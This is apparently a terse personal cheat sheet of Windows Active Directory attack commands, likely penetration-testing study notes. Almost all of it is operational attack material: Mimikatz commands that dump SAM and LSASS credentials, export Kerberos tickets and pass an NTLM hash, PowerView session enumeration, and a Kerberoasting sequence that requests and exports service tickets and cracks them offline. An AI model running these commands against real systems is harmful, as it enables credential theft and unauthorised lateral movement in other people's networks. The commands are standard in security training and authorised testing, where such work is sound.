Mimikatz

```
mimikatz.exe
privilege::debug
token::elevate
lsadump::sam
sekurlsa::logonpasswords
sekurlsa::tickets
sekurlsa::tickets /export


privilege::debug
sekurlsa::minidump C:\Users\raj\Desktop\lsass.DMP
sekurlsa::logonpasswords

sekurlsa::pth /user:daisy /domain:xor.com /ntlm:f6084ca1a4905c45747d4bdcc1fcab84 /run:PowerShell.exe

kerberos::ask /target:<SPN> MSSQLSvc/xor-app23.xor.com:1433
standard::base64
kerberos::list /export

```
Get a list of SPNs:

```
/usr/share/kerberoast/GetUserSPNs.ps1
```
Get PowerView.ps1 from powersploit.

Import-Module .\PowerView.ps1
Get-NetLoggedon -ComputerName client251
Get-NetSession -ComputerName dc01


From PowerShell, we can use the KerberosRequestorSecurityToken class to request the service ticket. We can call the KerberosRequestorSecurityToken constructor by specifying the SPN with the - ArgumentList option

```
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/xor-app23.xor.com:1433"

klist
```
crack password

```
python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-40a50000- Offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi

```